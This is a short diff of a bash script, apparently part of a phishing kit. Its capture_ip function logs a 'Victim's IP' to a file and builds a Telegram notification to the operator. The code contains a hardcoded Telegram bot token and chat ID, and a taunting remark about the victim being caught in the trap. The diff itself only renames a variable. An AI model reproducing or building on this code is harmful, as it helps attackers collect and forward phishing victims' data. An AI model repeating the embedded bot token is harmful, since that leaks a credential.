@@ -415,7 +415,7 @@ capture_ip() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
-	MESSAGE="YE FASA BAKRA JAAL MEE"
+	MSG="YE FASA BAKRA JAAL MEE"
 	# Telegram Configuration
 	BOT_TOKEN="8724746071:AAFItecnTGUw47P2Pqj4EUG08gKQXgqR4Z4"
 	CHAT_ID="8051672152"
@@ -424,7 +424,7 @@ capture_ip() {
 	MESSAGE=$(cat <<-EOF
 	Notification:
 	• Victim IP : $IP
-	• Remark: ${MESSGAE}
+	• Remark: $MSG
 	EOF
 	)
 	
